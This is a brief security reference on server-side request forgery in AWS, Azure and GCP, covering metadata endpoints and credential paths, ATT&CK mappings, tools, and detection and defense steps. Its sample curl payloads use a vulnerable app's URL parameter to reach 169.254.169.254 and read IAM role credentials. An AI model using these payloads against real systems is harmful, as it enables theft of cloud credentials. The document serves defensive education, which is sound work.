# Server-Side Request Forgery (SSRF) in Cloud Environments

## Overview
Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can manipulate a vulnerable server to send unauthorized HTTP requests. This can be exploited in cloud environments to access metadata services that expose temporary credentials and sensitive information.

## Targeted Cloud Metadata Endpoints
| Cloud | Metadata IP | Credential Path |
|-------|-------------|-----------------|
| AWS   | 169.254.169.254 | /latest/meta-data/iam/security-credentials/ |
| Azure | 169.254.169.254 | /metadata/identity/oauth2/token |
| GCP   | 169.254.169.254 | /computeMetadata/v1/instance/service-accounts/default/token |

## MITRE ATT&CK Techniques
- T1212: Exploitation for Credential Access
- T1071.001: Application Layer Protocol: Web
- T1557.001: Adversary-in-the-Middle

## Red Team Tools
- curl
- SSRFmap
- Burp Suite (with Collaborator)
- wfuzz

## Sample Exploitation Payloads
```bash
curl http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

AWS Example:
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
```

## Blue Team Detection and Defense

### Detection
- Monitor AWS CloudTrail for anomalous IAM role accesses
- Use VPC Flow Logs to detect access to metadata IPs
- Azure Monitor and GCP Audit Logs for unusual token usage

### Defense
- Enforce IMDSv2 in AWS
- Disable direct metadata access unless required
- Block 169.254.169.254 via outbound firewall/NACL rules
- Implement input validation and use URL allow-listing

## References
- AWS Security Blog: https://aws.amazon.com/blogs/security/
- SSRFmap GitHub: https://github.com/swisskyrepo/SSRFmap
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1212/
